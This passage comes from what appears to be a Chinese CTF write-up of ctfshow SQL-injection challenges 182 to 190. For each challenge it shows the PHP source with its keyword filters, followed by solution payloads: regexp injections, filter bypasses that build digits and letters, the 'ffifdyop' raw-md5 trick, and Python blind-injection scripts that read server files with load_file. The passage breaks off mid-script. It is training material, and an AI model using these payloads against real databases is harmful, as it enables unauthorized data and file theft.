<code>0'or(username)regexp'f'and'2</code></p>\n<p>或者根据前面做题，知 flag 始终在 id 为 26 的地方，故可以使用 <code>id=26</code> , 即 <code>0'or(id=26)and'2</code></p>\n<h1 id=\"web-183\"><a class=\"anchor\" href=\"#web-183\">#</a> web 183</h1>\n<p>``</p>\n<h1 id=\"web-184\"><a class=\"anchor\" href=\"#web-184\">#</a> web 184</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 查询语句</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 返回逻辑</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 查询结果</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-185\"><a class=\"anchor\" href=\"#web-185\">#</a> web 185</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>可以看到，相比上题，这题多过滤了数字，如果要用之前的十六进制，分别需要获取数字 0-9 和字母 x，A,B,C,D,E,F</p>\n<p>对于数字，在 SQL 中可以利用以下来获取</p>\n<pre><code class=\"language-mysql\">true 1\nfalse 0\nselect true;   --&gt;    1\nselect false;   --&gt;    0\nslect true+true; --&gt;    2\n\n//同时也可以利用ceil，floor来获取如pi(),version()中的数据\nselect pi();    --&gt; 3.141593\nselect floor(pi());   --&gt; 3\nselect ceil(pi());    --&gt; 4\n</code></pre>\n<p>这里已经想到办法获得数字了，下面是字母的获取，这里可以使用 char</p>\n<pre><code class=\"language-mysql\">select char(97);  --&gt;  'a'\n</code></pre>\n<p>于是字母数字均获得，下面是两种思路</p>\n<ol>\n<li>利用 substr/left/right 函数，截取字符串，其截取位置和长度可由 <code>true</code>  来生成，然后使用前面一样的 regexp 进行匹配，其中一种是使用 concat 和 char 连接字符串，一种是只截取一位然后一位一位匹配</li>\n<li>利用 UNHEX 和 concat 函数，其中 concat 用来连接字母数字成十六进制字符串，UNHEX 用来对十六进制进行解码</li>\n</ol>\n<p>下面针对第一个编写脚本</p>\n<pre><code class=\"language-python\"></code></pre>\n<h1 id=\"web-186\"><a class=\"anchor\" href=\"#web-186\">#</a> web 186</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\&lt;|\\&gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>相比之前过滤了 <code>%&lt;&gt;^</code> ，无影响，继续使用上题脚本</p>\n<h1 id=\"web-187\"><a class=\"anchor\" href=\"#web-187\">#</a> web 187</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from ctfshow_user where username = '<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>' and password= '<span class=\"token interpolation\"><span class=\"token variable\">$password</span></span>'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 只有 admin 可以获得 flag</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名不存在'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>经典 md5，输入用户名 <code>admin</code> ，密码 <code>ffifdyop</code></p>\n<p>md5('ffifdyop')=276f722736c95d99e921722cf9ed621c</p>\n<p>将其作为十六进制再解码后，可以得到 <code>'or' 6xxxx</code></p>\n<h1 id=\"web-188\"><a class=\"anchor\" href=\"#web-188\">#</a> web 188</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">}</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 用户名检测</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\'|\\\"/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>弱等于，字符串和数字比较，当字符串 = 0 恒成立，故可 username=0，password=0</p>\n<h1 id=\"web-189\"><a class=\"anchor\" href=\"#web-189\">#</a> web 189</h1>\n<p>提示 flag 在 api/index.php 文件中</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://fc44b510-a611-4cd6-86f7-2d734b41e643.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getFlagIndex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    head <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    tail <span class=\"token operator\">=</span> <span class=\"token number\">300</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"if(locate('ctfshow{',\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"load_file('/var/www/html/api/index.php'))&gt;{0},0,1)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span> <span class=\"token operator\">==</span> r<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> mid</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        head <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        i <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"if(ascii(substr(load_file('/var/www/html/api/index.php'),{0},1))&gt;{1},0,1)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                                                                                                               <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                                                                                                                   mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span> <span class=\"token operator\">==</span> r<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            mid <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span> head <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token keyword\">and</span> head <span class=\"token operator\">!=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result <span class=\"token operator\">+</span> <span class=\"token string\">\"}\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    index <span class=\"token operator\">=</span> getFlagIndex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    getFlag<span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-190\"><a class=\"anchor\" href=\"#web-190\">#</a> web 190</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>LastEditTime : 2023-07-15 17:59:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Description  : </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pwd <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>str_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>punctuation </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://4cd908a0-fce3-4625-81ad-18085f85af6e.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    left <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    right <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">+</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token 